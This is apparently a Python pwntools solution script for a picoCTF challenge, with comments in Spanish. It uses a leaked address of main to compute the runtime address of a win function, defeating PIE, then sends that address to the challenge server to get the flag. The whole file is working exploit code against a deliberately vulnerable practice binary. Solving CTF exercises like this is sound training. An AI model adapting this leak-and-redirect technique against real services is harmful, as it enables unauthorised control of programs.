from pwn import *

separador = "------------------------------------------"
# Configurar contexto
context.binary = ELF('./vuln')  # ¡Este debe ser el binario REMOTO!

# Calcular el offset real entre win y main
offset = context.binary.symbols['win'] - context.binary.symbols['main']
print(offset)
log.info(f"Offset entre win y main: {offset:#x}")

domain = input("Dame el dominio: ")
port = int(input("Dame el puerto: "))
domain="rescued-float.picoctf.net"
port=49610
# Conectarse al servidor remoto
io = remote(domain, port)

# Leer línea que contiene la dirección de main
print(separador)
print(io.recvuntil(b'Address of main: '))
print(separador)
main_addr = int(io.recvline().strip(), 16)

log.success(f"main() en runtime: {hex(main_addr)}")

# Calcular dirección de win() en tiempo de ejecución
win_addr = main_addr + offset
log.success(f"win() en runtime: {hex(win_addr)}")

# Enviar la dirección cuando la pida

print("Direccion: ",end="")
print(hex(win_addr).encode())
print(io.sendlineafter(b'Enter the address to jump to, ex => 0x12345: ', hex(win_addr).encode()))

print(io.recvall())
# Interactuar para ver la flag
io.interactive()
